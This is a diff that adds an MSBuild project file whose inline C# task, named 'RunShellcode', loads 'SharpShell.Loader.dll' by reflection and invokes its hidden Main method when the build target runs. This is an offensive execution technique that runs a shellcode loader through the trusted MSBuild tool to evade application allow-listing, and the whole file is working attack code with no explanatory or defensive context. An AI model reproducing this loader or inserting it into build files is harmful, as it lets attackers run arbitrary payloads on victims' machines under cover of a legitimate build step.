@@ -1,0 +1,37 @@
+﻿<Project ToolsVersion="Current" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+	<UsingTask TaskName="RunShellcode" TaskFactory="RoslynCodeTaskFactory" AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.Core.dll">
+		<Task>
+			<Using Namespace="System" />
+			<Using Namespace="System.IO" />
+			<Using Namespace="System.Runtime.InteropServices" />
+			<Using Namespace="System.Reflection"/>
+			<Code Type="Class" Language="cs">
+				<![CDATA[
+				using System;
+				using System.IO;
+				using System.Runtime.InteropServices;
+				using Microsoft.Build.Framework;
+				using Microsoft.Build.Utilities;
+				using System.Reflection;
+
+				public class RunShellcode : Task
+				{
+					public override bool Execute()
+					{
+						var dll = File.ReadAllBytes("SharpShell.Loader.dll");
+						var loader = Assembly.Load(dll);
+						var type = loader.GetType("SharpShell.Loader.Program")!;
+						var method = type.GetMethod("Main", BindingFlags.Static | BindingFlags.NonPublic)!;
+						var res = method.Invoke(null, new object[] {new string[] {}});
+						return true;
+					}
+				}
+				]]>
+			</Code>
+		</Task>
+	</UsingTask>
+
+	<Target Name="Run">
+		<RunShellcode />
+	</Target>
+</Project>
